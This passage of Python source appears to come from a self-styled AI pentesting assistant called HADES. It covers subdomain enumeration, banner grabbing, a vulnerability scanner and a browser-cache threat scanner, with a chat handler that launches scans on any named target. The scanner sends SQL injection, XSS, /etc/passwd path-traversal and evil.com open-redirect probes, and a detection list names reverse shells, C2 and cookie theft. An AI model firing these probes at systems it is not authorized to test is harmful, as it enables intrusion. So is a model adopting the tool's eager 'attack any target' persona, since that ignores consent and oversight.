                      'img', 'images', 'video', 'portal', 'secure', 'vpn', 'remote']
        found = []
        
        self.output.emit(f"[*] Enumerating subdomains for {domain}...")
        
        for i, sub in enumerate(subdomains):
            if self._stop:
                break
            try:
                full = f"{sub}.{domain}"
                socket.gethostbyname(full)
                found.append(full)
                self.output.emit(f"[+] Found: {full}")
            except:
                pass
            self.progress.emit(int((i + 1) / len(subdomains) * 100))
            
        return {'tool': 'subdomain_enum', 'target': domain, 'findings': found, 'error': None}
    
    def _banner_grab(self) -> Dict:
        host = self.target
        ports = [21, 22, 23, 25, 80, 110, 143, 443, 993, 995, 3306, 3389, 8080]
        banners = []
        
        self.output.emit(f"[*] Grabbing banners from {host}...")
        
        for i, port in enumerate(ports):
            if self._stop:
                break
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((host, port))
                    s.send(b"HEAD / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                    banner = s.recv(1024).decode('utf-8', errors='ignore')
                    if banner:
                        banners.append({'port': port, 'banner': banner[:200]})
                        self.output.emit(f"[+] Port {port}: {banner[:100]}")
            except:
                pass
            self.progress.emit(int((i + 1) / len(ports) * 100))
            
        return {'tool': 'banner_grab', 'target': host, 'findings': banners, 'error': None}
    
    def _vuln_scan(self) -> Dict:
        if not HAS_REQUESTS:
            return {'error': 'requests not installed'}
            
        url = self.target
        vulns = []
        
        self.output.emit(f"[*] Scanning {url} for vulnerabilities...")
        
        # Test for common vulnerabilities
        tests = [
            ("SQL Injection", f"{url}?id=1'", "sql", ["error", "mysql", "syntax", "query"]),
            ("XSS", f"{url}?q=<script>alert(1)</script>", "xss", ["<script>", "alert"]),
            ("Path Traversal", f"{url}/../../../etc/passwd", "path", ["root:", "/bin/"]),
            ("Open Redirect", f"{url}?url=https://evil.com", "redirect", ["evil.com"]),
        ]
        
        for i, (name, test_url, vuln_type, indicators) in enumerate(tests):
            if self._stop:
                break
            try:
                r = requests.get(test_url, timeout=5, verify=False,
                               headers={'User-Agent': 'Mozilla/5.0'})
                for indicator in indicators:
                    if indicator.lower() in r.text.lower():
                        vulns.append({'type': vuln_type, 'name': name, 'url': test_url})
                        self.output.emit(f"[!] Potential {name} found!")
                        break
            except:
                pass
            self.progress.emit(int((i + 1) / len(tests) * 100))
            
        return {'tool': 'vuln_scan', 'target': url, 'findings': vulns, 'error': None}


# ============================================================================
# BROWSER CACHE SCANNER
# ============================================================================

class BrowserScanner(QThread):
    progress = pyqtSignal(int)
    status = pyqtSignal(str)
    finished_scan = pyqtSignal(dict)
    finding_detected = pyqtSignal(dict)
    
    # Limits to prevent getting stuck
    MAX_FILES_PER_BROWSER = 500  # Max files to scan per browser
    MAX_TOTAL_FILES = 2000       # Max total files to scan
    SCAN_TIMEOUT = 120           # Timeout in seconds per browser
    
    THREAT_PATTERNS = [
        ('malware', r'malware|virus|trojan|ransomware', 'HIGH'),
        ('exploit', r'exploit|overflow|shellcode|payload', 'HIGH'),
        ('eval_code', r'eval\s*\(|exec\s*\(|Function\s*\(', 'HIGH'),
        ('obfuscation', r'fromCharCode|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|atob\s*\(', 'MEDIUM'),
        ('data_exfil', r'document\.cookie|localStorage|sessionStorage', 'MEDIUM'),
        ('injection', r'<script|javascript:|on\w+\s*=', 'MEDIUM'),
        ('crypto', r'crypto|bitcoin|wallet|miner', 'MEDIUM'),
        ('backdoor', r'backdoor|c2|command.*control|reverse.*shell', 'HIGH'),
    ]
    
    def __init__(self, kb: KnowledgeBase = None):
        super().__init__()
        self.kb = kb
        self._stop = False
        self.results = []
        self.findings = []
        self.stats = defaultdict(int)
        self._files_scanned = 0
        self._browser_file_count = 0
        self._scan_start_time = 0
        
    def _get_browser_paths(self) -> Dict:
        local = os.environ.get('LOCALAPPDATA', '')
        roaming = os.environ.get('APPDATA', '')
        
        return {
            'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
            'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default'),
            'Firefox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
            'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        }
        
    def stop(self):
        self._stop = True
        
    def run(self):
        self.results = []
        self.findings = []
        self.stats = defaultdict(int)
        self._files_scanned = 0
        
        browsers = self._get_browser_paths()
        total = len(browsers)
        
        self.status.emit("Starting browser cache scan...")
        
        for i, (browser, path) in enumerate(browsers.items()):
            if self._stop or self._files_scanned >= self.MAX_TOTAL_FILES:
                break
                
            self._browser_file_count = 0
            self._scan_start_time = time.time()
            
            self.status.emit(f"Scanning {browser}... ({self._files_scanned} files so far)")
            
            if os.path.exists(path):
                try:
                    self._scan_browser(browser, path)
                except Exception as e:
                    self.status.emit(f"Error scanning {browser}: {str(e)[:50]}")
            else:
                self.status.emit(f"{browser} not found, skipping...")
                
            self.progress.emit(int((i + 1) / total * 100))
            
        self.status.emit(f"Scan complete! {self._files_scanned} files scanned, {len(self.findings)} threats found.")
        
        self.finished_scan.emit({
            'results': self.results[-100:],  # Limit results to prevent memory issues
            'findings': self.findings,
            'stats': dict(self.stats)
        })
        
    def _scan_browser(self, browser: str, base_path: str):
        cache_dirs = ['Cache', 'Code Cache', 'GPUCache', 'Service Worker']
        
        for cache_dir in cache_dirs:
            if self._stop:
                return
            if self._browser_file_count >= self.MAX_FILES_PER_BROWSER:
                self.status.emit(f"{browser}: Reached file limit ({self.MAX_FILES_PER_BROWSER}), moving on...")
                return
            if time.time() - self._scan_start_time > self.SCAN_TIMEOUT:
                self.status.emit(f"{browser}: Timeout reached, moving on...")
                return
                
            cache_path = os.path.join(base_path, cache_dir)
            if os.path.exists(cache_path):
                self._scan_directory(browser, cache_path)
                
    def _scan_directory(self, browser: str, path: str):
        try:
            file_count = 0
            for root, dirs, files in os.walk(path):
                if self._stop:
                    return
                    
                # Check limits
                if self._browser_file_count >= self.MAX_FILES_PER_BROWSER:
                    return
                if self._files_scanned >= self.MAX_TOTAL_FILES:
                    return
                if time.time() - self._scan_start_time > self.SCAN_TIMEOUT:
                    return
                
                # Skip very deep directories
                depth = root.replace(path, '').count(os.sep)
                if depth > 5:
                    continue
                    
                for filename in files[:100]:  # Limit files per directory
                    if self._stop:
                        return
                    if self._browser_file_count >= self.MAX_FILES_PER_BROWSER:
                        return
                        
                    filepath = os.path.join(root, filename)
                    try:
                        self._analyze_file(browser, filepath)
                        self._files_scanned += 1
                        self._browser_file_count += 1
                        file_count += 1
                        
                        # Emit progress periodically
                        if file_count % 50 == 0:
                            self.status.emit(f"Scanning {browser}... ({self._browser_file_count} files)")
                    except Exception:
                        pass
                        
        except PermissionError:
            pass
        except Exception as e:
            pass
            
    def _analyze_file(self, browser: str, filepath: str):
        # Check stop flag immediately
        if self._stop:
            return
            
        try:
            stat = os.stat(filepath)
            size = stat.st_size
            
            if size > 5_000_000 or size == 0:
                return
            
            # Check stop flag again before reading file
            if self._stop:
                return
                
            content_preview = ""
            threats = []
            raw_content = b''
            
            try:
                with open(filepath, 'rb') as f:
                    raw_content = f.read(50000)
                    try:
                        content = raw_content.decode('utf-8', errors='ignore')
                        content_preview = content[:500]
                        
                        # Check stop flag before pattern matching
                        if self._stop:
                            return
                        
                        for threat_name, pattern, severity in self.THREAT_PATTERNS:
                            if self._stop:
                                return
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            if matches:
                                context_matches = re.findall(f'.{{0,50}}{pattern}.{{0,50}}', content, re.IGNORECASE)
                                for match in context_matches[:3]:
                                    if self._stop:
                                        return
                                    finding = ThreatFinding(
                                        path=filepath,
                                        threat_type=threat_name,
                                        pattern=pattern,
                                        severity=severity,
                                        code_snippet=match.strip()[:200],
                                        browser=browser,
                                        context=content_preview
                                    )
                                    self.findings.append(finding)
                                    threats.append(finding)
                                    
                                    if self.kb:
                                        self.kb.store_threat_finding(finding)
                                        
                                    self.finding_detected.emit({
                                        'path': filepath,
                                        'type': threat_name,
                                        'severity': severity,
                                        'code': match.strip()[:200],
                                        'browser': browser
                                    })
                                    
                                    self._learn_from_finding(finding)
                                    
                    except:
                        pass
            except:
                pass
            
            if self._stop:
                return
                
            risk = 'HIGH' if threats else ('MEDIUM' if any(p in filepath.lower() for p in ['.exe', '.dll', 'script']) else 'LOW')
            
            self.stats['total_files'] += 1
            self.stats['total_size'] += size
            self.stats[f'{risk.lower()}_risk'] += 1
            self.stats[browser] += 1
            
            if threats:
                self.stats['threats'] += len(threats)
                
            self.results.append(CacheEntry(
                path=filepath, size=size, modified=stat.st_mtime,
                file_hash=hashlib.md5(raw_content[:1000]).hexdigest()[:8] if raw_content else '',
                file_type=os.path.splitext(filepath)[1] or '.unknown',
                risk_level=risk, browser=browser, content_preview=content_preview
            ))
            
        except Exception as e:
            pass
            
    def _learn_from_finding(self, finding: ThreatFinding):
        if self.kb and finding.code_snippet:
            pattern_id = hashlib.sha256(finding.code_snippet.encode()).hexdigest()[:16]
            pattern = SecurityPattern(
                pattern_id=pattern_id,
                pattern_type=finding.threat_type,
                signature=re.escape(finding.code_snippet[:50]),
                confidence=0.7,
                occurrences=1,
                examples=[finding.code_snippet],
                countermeasures=[],
                cwe_ids=[]
            )
            self.kb.store_pattern(pattern)


# ============================================================================
# AI CHAT PROCESSOR
# ============================================================================

class ChatProcessor:
    COMMANDS = {
        'full_scan': ['scan https://', 'scan http://', 'full scan', 'recon ', 'go to work on', 'attack '],
        'scan': ['scan ports', 'port scan', 'nmap', 'scan ports on'],
        'bruteforce': ['bruteforce', 'brute force', 'dir scan', 'directory bruteforce'],
        'subdomain': ['subdomain', 'subdomains', 'enum sub', 'find subdomains'],
        'banner': ['banner', 'grab banner', 'service detection'],
        'vuln': ['vuln scan', 'vulnerability scan', 'scan for vulnerabilities', 'find vulnerabilities'],
        'learn': ['learn from', 'study', 'analyze url'],
        'cache': ['scan cache', 'browser cache', 'cache scan', 'scan browser'],
        'help': ['help', 'commands', 'what can you do', '?'],
        'status': ['status', 'stats', 'statistics', 'show stats'],
        'show_exploits': ['show exploits', 'show learned exploits', 'list exploits', 'learned exploits', 'view exploits'],
        'show_findings': ['show findings', 'show threats', 'list findings', 'threat findings', 'view findings'],
        'greeting': ['hello', 'hi ', 'hey', 'how are you', 'whats up', "what's up"],
    }
    
    def __init__(self, kb: KnowledgeBase):
        self.kb = kb
        self.context = {}
        
    def process(self, message: str) -> Dict[str, Any]:
        message_lower = message.lower().strip()
        
        self.kb.store_chat('user', message)
        
        # Check for exact/longer matches first (more specific commands)
        matched_cmd = None
        matched_len = 0
        for cmd, triggers in self.COMMANDS.items():
            for trigger in triggers:
                if trigger in message_lower and len(trigger) > matched_len:
                    matched_cmd = cmd
                    matched_len = len(trigger)
        
        if matched_cmd:
            return self._handle_command(matched_cmd, message)
                
        return self._generate_response(message)
        
    def _handle_command(self, cmd: str, message: str) -> Dict:
        url_match = re.search(r'https?://[^\s]+', message)
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', message)
        domain_match = re.search(r'\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b', message, re.IGNORECASE)
        
        target = url_match.group() if url_match else (ip_match.group() if ip_match else (domain_match.group() if domain_match else None))
        
        if cmd == 'greeting':
            greetings = [
                "Hey there! I'm HADES, your AI pentesting assistant. Ready to hunt some vulnerabilities? 🔥",
                "Hello! HADES online and ready. What target shall we analyze today?",
                "Greetings! I'm operational and eager to find security weaknesses. Give me a target!",
                "Hey! I'm doing great, always ready to scan and exploit. What's our mission?",
            ]
            import random
            return {'response': random.choice(greetings), 'action': None}
        
        if cmd == 'help':
            return {
                'response': """🔥 **HADES AI - Commands:**

**Scanning:**
• "scan https://example.com" - Full reconnaissance scan
• "scan ports on 192.168.1.1" - Port scan
• "vuln scan http://target.com" - Vulnerability scan

**Reconnaissance:**
• "find subdomains of example.com" - Subdomain enumeration  
• "bruteforce http://target.com" - Directory bruteforce

**Learning:**
• "learn from https://exploit-db.com/..." - Learn exploits from URL
• "scan browser cache" - Analyze cached files for threats

**View Data:**
• "show stats" - View statistics
• "show exploits" - View learned exploits
• "show findings" - View threat findings

Just give me a URL or IP and I'll get to work!""",
                'action': None
            }
        
        if cmd == 'full_scan':
            if not target:
                return {
                    'response': "I need a target URL or domain for a full scan. Try: 'scan https://example.com'",
                    'action': None
                }
            return {
                'response': f"🚀 **Initiating full reconnaissance on {target}**\n\nThis will:\n• Learn from the target URL\n• Check for exposed paths\n• Analyze security headers\n• Look for vulnerabilities\n\nStand by for results...",
                'action': {'type': 'full_scan', 'target': target}
            }
            
        if cmd == 'status':
            stats = self._get_stats()
            return {'response': stats, 'action': None}
            
        if cmd == 'show_exploits':
            return self._show_learned_exploits()
            
        if cmd == 'show_findings':
            return self._show_threat_findings()
            
        if cmd == 'cache':
            return {
                'response': "Starting browser cache scan. I'll analyze all cached files for threats and learn from any malicious patterns found.",
                'action': {'type': 'cache_scan'}
            }
            
        if not target and cmd not in ['cache', 'show_exploits', 'show_findings']:
            return {
                'response': f"I understand you want to {cmd}, but I need a target. Please provide an IP, domain, or URL.",
                'action': None
            }
            
        tool_map = {
            'scan': 'port_scan',
            'bruteforce': 'dir_bruteforce', 
            'subdomain': 'subdomain_enum',
            'banner': 'banner_grab',
            'vuln': 'vuln_scan',
            'learn': 'web_learn'
        }
        
        return {
            'response': f"Starting {cmd} on {target}. I'll report findings as I discover them.",
            'action': {'type': tool_map.get(cmd, cmd), 'target': target}
        }
        
    def _generate_response(self, message: str) -> Dict:
        """Generate intelligent responses based on learned knowledge"""
        message_lower = message.lower()
        
        # Query knowledge base for relevant information
        knowledge = self.kb.query_knowledge(message)
        techniques = knowledge.get('techniques', [])
        cves = knowledge.get('cves', [])
        exploits = self.kb.get_learned_exploits(5)
        patterns = self.kb.get_patterns()
        ip_info = knowledge.get('ip_info')
        
        # Check if message contains a URL or domain - probably wants to scan it
        url_match = re.search(r'https?://[^\s]+', message)
        domain_match = re.search(r'\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b', message, re.IGNORECASE)
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', message)
        cve_match = re.search(r'CVE-\d{4}-\d+', message, re.IGNORECASE)
        
        # Handle CVE queries
        if cve_match:
            cve_id = cve_match.group().upper()
            cve_results = self.kb.search_cves(cve_id, 1)
            if cve_results:
                cve = cve_results[0]
                response = f"**{cve_id}**\n\n"
                response += f"**Summary:** {cve['summary'][:300]}...\n\n"
                response += f"**CVSS Score:** {cve['cvss']}\n"
                if cve['mitigations']:
                    response += f"\n**Mitigations:**\n"
                    for m in cve['mitigations'][:3]:
                        response += f"• {m}\n"
            else:
                response = f"I don't have information about {cve_id} yet. I can learn about it if you point me to a URL with its details."
            self.kb.store_chat('assistant', response)
            return {'response': response, 'action': None}
        
        # Handle IP reputation queries
        if ip_match and ip_info:
            ip = ip_match.group()
            response = f"**IP Reputation for {ip}:**\n\n"
            response += f"• **Threat Score:** {ip_info['threat_score']:.1f}/10\n"
            response += f"• **Attack Count:** {ip_info['attack_count']}\n"
            response += f"• **Categories:** {', '.join(ip_info['categories']) if ip_info['categories'] else 'None'}\n"
            response += f"• **Status:** {'🚫 BLOCKED' if ip_info['is_blocked'] else '✅ Not blocked'}\n"
            response += f"• **First Seen:** {ip_info['first_seen'][:10] if ip_info['first_seen'] else 'N/A'}\n"
            
            if ip_info['threat_score'] >= 5.0:
                response += f"\n⚠️ **This IP is considered HIGH RISK.** Consider blocking it."
            self.kb.store_chat('assistant', response)
            return {'response': response, 'action': None}
        
        # Handle target detection
        if url_match or domain_match:
            target = url_match.group() if url_match else domain_match.group()
            response = f"I detected a target: **{target}**\n\nWould you like me to scan it? Try:\n• 'scan {target}' - Full reconnaissance\n• 'learn from {target}' - Extract exploit patterns\n• 'vuln scan {target}' - Vulnerability scan"
            self.kb.store_chat('assistant', response)
            return {'response': response, 'action': None}
        
        # Handle security topic queries using learned knowledge
        security_keywords = ['sql', 'injection', 'xss', 'csrf', 'brute', 'scan', 'attack', 
                            'vulnerability', 'exploit', 'defense', 'protect', 'secure',
                            'port', 'firewall', 'detect', 'intrusion', 'malware']
        
        matched_keyword = None
        for keyword in security_keywords:
            if keyword in message_lower:
                matched_keyword = keyword
                break
        
        if matched_keyword and (techniques or exploits):
            response = self._build_knowledge_response(matched_keyword, techniques, exploits, patterns)
            self.kb.store_chat('assistant', response)
            return {'response': response, 'action': None}
        
        # Standard responses
        if 'what' in message_lower and 'learn' in message_lower:
            response = f"I've learned **{len(patterns)} security patterns** and **{len(exploits)} exploits** from various sources.\n\n"
            if techniques:
                response += f"**Techniques I Know ({len(techniques)}):**\n"
                for t in techniques[:5]:
                    response += f"• {t['name']} ({t['category']})\n"
            if exploits:
                response += f"\nRecent exploits from: {', '.join(set(e['source_url'][:30] for e in exploits[:3]))}"
        elif 'exploit' in message_lower:
            if exploits:
                response = "Here are some exploits I've learned:\n"
                for e in exploits[:3]:
                    response += f"\n• **{e['exploit_type']}** from {e['source_url'][:40]}:\n```\n{e['code'][:150]}\n```\n"
            else:
                response = "I haven't learned any exploits yet. Point me to a URL with exploit code using 'learn from https://...'"
        elif 'who' in message_lower and 'you' in message_lower:
            response = "I'm **HADES** - a self-learning AI pentesting assistant. I can:\n\n"
            response += "• 🔍 Scan targets for vulnerabilities\n"
            response += "• 📚 Learn exploit patterns from websites\n"
            response += "• 🛡️ Monitor network and auto-defend against attacks\n"
            response += "• 💡 Provide security guidance based on my knowledge\n\n"
            response += f"I currently know **{len(patterns)} patterns**, **{len(exploits)} exploits**, and **{len(techniques)} techniques**."
        elif 'thank' in message_lower:
            response = "You're welcome! Ready for the next target whenever you are. 🔥"
        elif 'defend' in message_lower or 'protect' in message_lower or 'block' in message_lower:
            response = self._get_defense_guidance(message_lower)
        else:
            # Try to find relevant knowledge anyway
            if techniques:
                response = f"Based on my knowledge, you might be interested in:\n\n"
                for t in techniques[:2]:
                    response += f"**{t['name']}** ({t['category']})\n"
                    if t['mitigations']:
                        response += f"  Mitigations: {', '.join(t['mitigations'][:2])}\n"
                response += f"\nOr try: **'help'** for commands, **'show stats'** for statistics"
            else:
                response = "I'm not sure what you want me to do. Try:\n\n• **'scan https://example.com'** - Run a full scan\n• **'help'** - See all commands\n• **'show stats'** - View my statistics\n\nOr just give me a URL/IP and I'll figure out what to do with it!"
            
        self.kb.store_chat('assistant', response)
        return {'response': response, 'action': None}
    
    def _build_knowledge_response(self, topic: str, techniques: List, exploits: List, patterns: List) -> str:
        """Build an intelligent response based on learned knowledge"""
        response = f"**🔍 Knowledge about '{topic}':**\n\n"
        
        # Add relevant techniques
        relevant_techniques = [t for t in techniques if topic.lower() in t['name'].lower() 
                              or topic.lower() in t['category'].lower() 
                              or topic.lower() in t.get('description', '').lower()]
        
        if relevant_techniques:
            response += "**Techniques:**\n"
            for t in relevant_techniques[:3]:
                response += f"• **{t['name']}** ({t['category']})\n"
                if t['indicators']:
                    response += f"  Indicators: {', '.join(t['indicators'][:2])}\n"
                if t['mitigations']:
                    response += f"  Mitigations: {', '.join(t['mitigations'][:2])}\n"
        
        # Add relevant exploits
        relevant_exploits = [e for e in exploits if topic.lower() in e['exploit_type'].lower()]
        if relevant_exploits:
            response += f"\n**Learned Exploits ({len(relevant_exploits)}):**\n"
            for e in relevant_exploits[:2]:
                response += f"• {e['exploit_type']} from {e['source_url'][:40]}\n"
        
        # Add defensive guidance
        response += f"\n**Defensive Recommendations:**\n"
        if 'sql' in topic or 'injection' in topic:
            response += "• Use parameterized queries/prepared statements\n• Implement input validation\n• Apply least privilege to database accounts\n"
        elif 'xss' in topic:
            response += "• Encode output properly\n• Use Content-Security-Policy headers\n• Validate and sanitize input\n"
        elif 'brute' in topic:
            response += "• Implement account lockout\n• Use MFA\n• Add rate limiting\n"
        elif 'scan' in topic or 'port' in topic:
            response += "• Use firewall rules to limit exposed ports\n• Implement port knocking\n• Use IDS/IPS systems\n"
        else:
            response += "• Keep systems updated\n• Monitor logs for anomalies\n• Implement defense in depth\n"
        
        return response
    
    def _get_defense_guidance(self, message: str) -> str:
        """Provide defense guidance based on context"""
        response = "**🛡️ Defense Guidance:**\n\n"
        
        if 'brute' in message or 'password' in message:
            response += "**Against Brute Force:**\n"
            response += "• Implement account lockout after 5 failed attempts\n"
            response += "• Use MFA (multi-factor authentication)\n"
            response += "• Add CAPTCHA after 3 failed attempts\n"
            response += "• Use fail2ban or similar tools\n"
        elif 'scan' in message or 'port' in message:
            response += "**Against Port Scanning:**\n"
            response += "• Enable firewall and close unnecessary ports\n"
            response += "• Use port knocking for sensitive services\n"
            response += "• Deploy IDS (Intrusion Detection System)\n"
            response += "• Monitor for scanning patterns\n"
        elif 'ddos' in message or 'dos' in message:
            response += "**Against DDoS:**\n"
            response += "• Use CDN with DDoS protection\n"
            response += "• Implement rate limiting\n"
            response += "• Have emergency response plan ready\n"
        else:
            response += "**General Security:**\n"
            response += "• Keep all systems patched\n"
            response += "• Enable HADES network monitoring with auto-defense\n"
            response += "• Regularly review logs and alerts\n"
            response += "• Implement least privilege access\n"
        
        response += "\n**Tip:** Enable my Network Monitor with Defense Mode for automatic protection!"
        return response
        
    def _get_stats(self) -> str:
        cursor = self.kb.conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM experiences')
        exp_count = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM security_patterns')
        pattern_count = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM learned_exploits')
        exploit_count = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM threat_findings')
        threat_count = cursor.fetchone()[0]
        
        return f"""**HADES AI Statistics:**
• Experiences: {exp_count}
• Learned Patterns: {pattern_count}
• Learned Exploits: {exploit_count}
• Threats Detected: {threat_count}

I'm continuously learning from cache scans and websites you point me to."""

    def _show_learned_exploits(self) -> Dict:
        """Show all learned exploits from the database"""
        exploits = self.kb.get_learned_exploits(20)
        
        if not exploits:
            return {
                'response': "**No exploits learned yet.**\n\nTo learn exploits, use:\n• `learn from https://exploit-db.com/...`\n• `scan browser cache` to find cached exploits",
                'action': None
            }
        
        # Group by type
        exploit_types = {}
        for e in exploits:
            t = e['exploit_type']
            if t not in exploit_types:
                exploit_types[t] = []
            exploit_types[t].append(e)
        
        response = f"**📚 Learned Exploits ({len(exploits)} total):**\n\n"
        
        for exploit_type, type_exploits in exploit_types.items():
            response += f"**{exploit_type.upper()}** ({len(type_exploits)} variants):\n"
            for e in type_exploits[:5]:
                source = e['source_url'][:50] + "..." if len(e['source_url']) > 50 else e['source_url']
                success_rate = e['success_count'] / max(1, e['success_count'] + e['fail_count'])
                response += f"  • Source: {source}\n"
                response += f"    Success Rate: {success_rate:.0%} | Learned: {e['learned_at'][:10]}\n"
                # Show first line of code
                code_preview = e['code'].split('\n')[0][:60]
                response += f"    Code: `{code_preview}...`\n"
            response += "\n"
        
        return {'response': response, 'action': None}
    
    def _show_threat_findings(self) -> Dict:
        """Show all threat findings from the database"""
        findings = self.kb.get_threat_findings(20)
        
        if not findings:
            return {
                'response': "**No threats detected yet.**\n\nTo detect threats:\n• `scan browser cache` to analyze cached files\n• `vuln scan http://target.com` to scan a target",
                'action': None
            }
        
        # Group by severity
        by_severity = {'HIGH': [], 'MEDIUM': [], 'LOW': []}
        for f in findings:
            sev = f.get('severity', 'LOW')
            if sev in by_severity:
                by_severity[sev].append(f)
        
        response = f"**🔍 Threat Findings ({len(findings)} total):**\n\n"
        
        for severity in ['HIGH', 'MEDIUM', 'LOW']:
            sev_findings = by_severity[severity]
            if sev_findings:
                emoji = {'HIGH': '🔴', 'MEDIUM': '🟠', 'LOW': '🟢'}[severity]
                response += f"**{emoji} {severity}** ({len(sev_findings)} findings):\n"
                for f in sev_findings[:5]:
                    path_short = f['path'][-40:] if len(f['path']) > 40 else f['path']
                    response += f"  • **{f['threat_type']}** in `{path_short}`\n"
                    response += f"    Browser: {f['browser']} | Pattern: `{f.get('pattern', 'N/A')[:30]}`\n"
                response += "\n"
        
        return {'response': response, 'action': None}


# ============================================================================
# CODE EDITOR ASSISTANT - GPT-Powered Code Analysis
# ============================================================================

class CodeEditorAssistant:
    """Enhanced Code Editor Assistant with GPT integration and file operations"""
    
    def __init__(self):
        self.current_code = ""
        self.files = {}  # filename -> code str
        self.last_code = ""
        self.mode = 'chat'  # Modes: chat, code, explain, assist
        
    def set_code(self, code: str):
        self.current_code = code
        self.last_code = code
        
    def load_file(self, filename: str) -> str:
        """Load a file into memory for editing"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                self.files[filename] = f.read()
                self.current_code = self.files[filename]
                return f"[📂] Loaded file: {filename} ({len(self.files[filename])} chars)"
        except Exception as e:
            return f"[❌] Failed to load {filename}: {e}"
    
    def save_file(self, filename: str) -> str:
        """Save the current code to a file"""
        if filename not in self.files:
            return "[⚠️] File not loaded. Use load_file first."
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(self.files[filename])
            return f"[💾] File saved: {filename}"
        except Exception as e:
            return f"[❌] Save failed: {e}"
    
    def analyze_file(self, filename: str) -> str:
        """Analyze a loaded file and return function info"""
        if filename not in self.files:
            return "[⚠️] File not loaded."
        try:
            code = self.files[filename]
            tree = ast.parse(code)
            result = []
            for node in tree.body:
                if isinstance(node, ast.FunctionDef):
                    func_name = node.name
                    args = [arg.arg for arg in node.args.args]
                    docstring = ast.get_docstring(node)
                    lines = len(node.body)
                    result.append(f"🔎 Function `{func_name}`: args={args}, lines={lines}, doc={docstring or 'None'}")
                elif isinstance(node, ast.ClassDef):
                    class_name = node.name
                    methods = [n.name for n in node.body if isinstance(n, ast.FunctionDef)]
                    result.append(f"📦 Class `{class_name}`: methods={methods}")
            return "\n".join(result) if result else "[ℹ️] No functions or classes found."
        except Exception as e:
            return f"[❌] Analysis Error:\n{traceback.format_exc()}"
    
    def explain_code(self, code_str: str) -> str:
        """Explain Python code structure"""
        try:
            tree = ast.parse(code_str)
            explanations = []
            for node in tree.body:
                if isinstance(node, ast.FunctionDef):
                    args = [arg.arg for arg in node.args.args]
                    explanations.append(f"📘 Function `{node.name}` takes args: {args}")
                elif isinstance(node, ast.ClassDef):
                    explanations.append(f"📦 Class `{node.name}` defined")
                elif isinstance(node, ast.Import):
                    modules = [alias.name for alias in node.names]
                    explanations.append(f"📦 Imports modules: {modules}")
                elif isinstance(node, ast.ImportFrom):
                    modules = [alias.name for alias in node.names]
                    explanations.append(f"📦 From {node.module} import {modules}")
                elif isinstance(node, ast.Assign):
                    targets = [ast.unparse(t) for t in node.targets]
                    explanations.append(f"🔧 Variable(s) assigned: {targets}")
            return "\n".join(explanations) if explanations else "ℹ️ No recognizable constructs to explain."
        except Exception as e:
            return f"❌ Explanation Error:\n{traceback.format_exc()}"
    
    def gpt_analyze(self, code_snippet: str, instruction: str = "Analyze and improve this code", api_key: str = None) -> str:
        """Use GPT to analyze or modify code"""
        if not HAS_OPENAI:
            return "[GPT] OpenAI module not available. Install with: pip install openai"
        
        key = api_key or os.getenv("OPENAI_API_KEY", "")
        if not key:
            return "[GPT] No API key set. Enter your API key in the Self-Improvement tab."
        
        try:
            client = OpenAI(api_key=key)
            response = client.chat.completions.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": "You are an expert code assistant. Analyze code, find bugs, suggest improvements, and help with refactoring. Be concise and practical."},
                    {"role": "user", "content": f"{instruction}:\n\n```python\n{code_snippet}\n```"}
                ],
                max_tokens=2000,
                temperature=0.7
            )
            return response.choices[0].message.content
        except Exception as e:
            return f"[GPT ERROR] {e}"
    
    def gpt_modify(self, code_snippet: str, instruction: str, api_key: str = None) -> str:
        """Use GPT to modify code based on instruction"""
        if not HAS_OPENAI:
            return self.apply_instruction_local(instruction)
        
        key = api_key or os.getenv("OPENAI_API_KEY", "")
        if not key:
            return self.apply_instruction_local(instruction)
        
        try:
            client = OpenAI(api_key=key)
            response = client.chat.completions.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": "You are a code modification assistant. Apply the user's instruction to modify the code. Return ONLY the modified code without explanations."},
                    {"role": "user", "content": f"Apply this instruction to the code: {instruction}\n\nCode:\n```python\n{code_snippet}\n```\n\nReturn only the modified code."}
                ],
                max_tokens=2000,
                temperature=0.3
            )
            return response.choices[0].message.content
        except Exception as e:
            return self.apply_instruction_local(instruction)
    
    def analyze_file_with_gpt(self, filename: str) -> str:
        """Load a file and send each function to GPT for analysis"""
        if filename not in self.files:
            load_result = self.load_file(filename)
            if "Failed" in load_result:
                return load_result
        
        try:
            code = self.files[filename]
            tree = ast.parse(code)
            results = []
            
            for node in tree.body:
                if isinstance(node, ast.FunctionDef):
                    func_code = ast.unparse(node)
                    gpt_result = self.gpt_analyze(func_code, f"Review this function `{node.name}` for bugs, security issues, and improvements")
                    results.append(f"--- GPT Analysis for `{node.name}` ---\n{gpt_result}")
            
            return "\n\n".join(results) if results else "[ℹ️] No functions to analyze."
        except Exception as e:
            return f"[❌] GPT Analysis Error:\n{traceback.format_exc()}"
    
    def apply_instruction_local(self, instruction: str) -> str:
        """Apply instruction without GPT (fallback)"""
        instruction_lower = instruction.lower()
        
        if "wrap in function" in instruction_lower:
            indented = "\n".join("    " + line for line in self.current_code.splitlines())
            return f"def wrapped_function():\n{indented}"
        elif "remove print" in instruction_lower:
            return "\n".join(line for line in self.current_code.splitlines() if "print" not in line.lower())
        elif "add logging" in instruction_lower:
